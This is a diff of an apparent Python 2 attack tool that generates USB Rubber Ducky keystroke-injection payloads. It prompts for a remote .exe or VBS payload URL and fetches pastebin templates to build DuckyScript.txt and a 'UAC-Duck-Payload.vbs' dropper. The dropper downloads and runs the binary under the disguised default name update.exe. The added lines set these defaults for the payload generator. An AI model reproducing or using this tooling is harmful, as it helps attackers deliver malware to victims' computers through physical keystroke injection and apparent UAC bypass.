@@ -3,7 +3,7 @@ import urllib
 import urllib2
 import time
 import os
-
+		
 def duckencode():
 	if os.path.isfile('duckencoder.jar'):
 		print "Would you like to encode the ducky script? (Yes/No y/n)?"
@@ -37,8 +37,7 @@ def duckencodedownload():
 		main()	
 	else:
 		print "Please answer Yes(y) or No(n)"
-
-
+	
 def genscripton():
 	if os.path.isfile('DuckyScript.txt'):
 		os.remove('DuckyScript.txt')
@@ -46,10 +45,20 @@ def genscripton():
 	print "-> Ducky payload [Online version] <- "
 	print "[+]Please input your UAC VBS Payload URL(Pastebin/RAW recommended):"
 	genpayon_url = raw_input().lower()
+	
 	print "[+]Please input your Payload save filename (Deafult: update.vbs):"
 	genpayon_name = raw_input().lower()
-	if genpayon_name.endswith(".vbs"):
 	
+	if not genpayon_name:
+		print 'Using deafult params' 
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/Gfie3EHU").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', "update.vbs")
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		time.sleep(2)
+	elif genpayon_name.endswith(".vbs"):
 		with open('DuckyScript.txt', 'a') as the_file:
 			txt = urllib.urlopen("http://pastebin.com/raw/Gfie3EHU").read()
 			txt = txt.replace('[URL]', genpayon_url)
@@ -60,22 +69,36 @@ def genscripton():
 	else:
 		print "Please input a valid URL ( Must end with .vbs)"
 		genscripton()
+				
 	
 def genscriptoff():
 	print "Ducky payload [Offline version]"
 	print "Not yet released, will be coming soon"
 	main()
 	
+	
 def genpayon():
 	if os.path.isfile('UAC-Duck-Payload.vbs'):
 		os.remove('UAC-Duck-Payload.vbs')
+		
 	print "-> Ducky UAC payload [Online version] <- "
 	print "[+]Please input your binary Payload URL:"
 	genpayon_url = raw_input().lower()
+	
 	if genpayon_url.endswith(".exe"):
 		print "[+]Please input your Payload save filename (Deafult: update.exe):"
 		genpayon_name = raw_input().lower()
-		if genpayon_name.endswith(".exe"):
+		
+		if not genpayon_name:
+			print 'Using deafult params' 
+			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
+					txt = urllib.urlopen("http://pastebin.com/raw/jjcB4dJY").read()
+					txt = txt.replace('[URL]', genpayon_url)
+					txt = txt.replace('/[NAME]', "/update.exe")
+					the_file.write(txt)
+			print "Payload UAC-Duck-Payload.vbs generated!"
+			time.sleep(2)
+		elif genpayon_name.endswith(".exe"):
 			
 			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
 				txt = urllib.urlopen("http://pastebin.com/raw/jjcB4dJY").read()
@@ -91,6 +114,7 @@ def genpayon():
 	else:
 		print "Please input a valid URL ( Must end with .exe)"
 		genpayon()
+		
 
 	
 def genpayoff():
